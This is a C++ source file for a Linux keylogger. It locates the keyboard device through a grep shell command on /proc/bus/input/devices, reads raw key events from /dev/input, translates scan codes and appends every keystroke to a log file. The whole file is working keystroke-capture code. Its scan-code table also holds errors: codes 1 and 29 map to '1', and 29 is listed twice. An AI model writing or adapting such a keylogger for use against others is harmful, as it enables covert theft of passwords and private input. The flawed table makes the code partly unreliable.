#include "Keylogger.h"

#include <array>
#include <iostream>
#include <memory>
#include <unordered_map>

/**
 * Lookup table for keyboard scan codes.
 */
const static std::unordered_map<short, std::string> lookup_table = {
    {41, "`"},          {2, "1"},
    {3, "2"},           {4, "3"},
    {5, "4"},           {6, "5"},
    {7, "6"},           {8, "7"},
    {9, "8"},           {10, "9"},
    {11, "0"},          {12, "-"},
    {13, "="},          {14, "[backspace]"},
    {1, "1"},           {15, "[tab]"},
    {16, "q"},          {17, "w"},
    {18, "e"},          {19, "r"},
    {20, "t"},          {21, "y"},
    {22, "u"},          {23, "i"},
    {24, "o"},          {25, "p"},
    {26, "["},          {27, "]"},
    {43, "\\"},         {29, "1"},
    {30, "a"},          {31, "s"},
    {32, "d"},          {33, "f"},
    {34, "g"},          {35, "h"},
    {36, "j"},          {37, "k"},
    {38, "l"},          {39, ";"},
    {40, "'"},          {28, "[enter]"},
    {42, "[shift]-"},   {44, "z"},
    {45, "x"},          {46, "c"},
    {47, "v"},          {48, "b"},
    {49, "n"},          {50, "m"},
    {51, ","},          {52, "."},
    {53, "/"},          {29, "[ctrl]"},
    {125, "[windows]"}, {56, "[alt]"},
    {57, " "},          {100, "[alt]"},
    {126, "[windows]"}, {97, "[ctrl]"}};

/**
 * Executes a shell command and returns the result.
 *
 * Params:
 *  cmd: The command to be executed.
 *
 * Returns:
 *  The standard output of the command.
 */
// TODO: Move this function into a separate file/class since it can be used for other things.
std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result = "";
    // Creates a unique pointer that uses the pclose() function as a destructor
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

/**
 * Constructs a Keylogger object.
 */
Keylogger::Keylogger(std::string log_filename) {
    m_log_filename = log_filename;
    m_done = false;
    m_keyboard_path = get_keyboard_path();
    printf("Using %s as input device\n", m_keyboard_path.c_str());
    // TODO: Use exceptions instead of if statements
    if ((m_keyboard_fd = open(m_keyboard_path.c_str(), O_RDONLY)) == -1) {
        perror("Invalid device link");
        exit(1);
    }
}

/**
 * Starts the keylogging loop.
 *
 * Params: None
 *
 * Returns: None
 */
void Keylogger::start_logging() {
    while (!m_done) {
        read(m_keyboard_fd, &m_ev, sizeof(struct input_event));
        if (m_ev.type == EV_KEY && m_ev.value == 1) {
            process_keys();
        }
    }
}

bool Keylogger::stop_logging() {
    m_done = true;
    return m_done;
}

/**
 * Processes key input based on the lookup table and writes the keys to the log file.
 *
 * Params: None
 *
 * Returns: None
 */
void Keylogger::process_keys() {
    std::unique_ptr<FILE, decltype(&fclose)> logfile_ptr(fopen(m_log_filename.c_str(), "a+"),
                                                         fclose);
    try {
        fprintf(logfile_ptr.get(), "%s", lookup_table.at(m_ev.code).c_str());
    } catch (const std::out_of_range& oor) {
        std::cerr << oor.what() << ": scan code not found\n";
    }
}

/**
 * Gets a keyboard device path from /proc/bus/input/devices
 * and makes it usable by the keylogger.
 *
 * Params: None
 *
 * Returns: The keyboard device path.
 */
std::string Keylogger::get_keyboard_path() {
    // TODO: find a better way to do this
    std::string device_name =
        exec("grep -A 4 ^N.*[kK]eyboard /proc/bus/input/devices | grep -o event[0-9]");
    device_name.insert(0, "/dev/input/");
    device_name.erase(
        device_name.find('\n')); // just in case there's a newline character at the end
    return device_name;
}
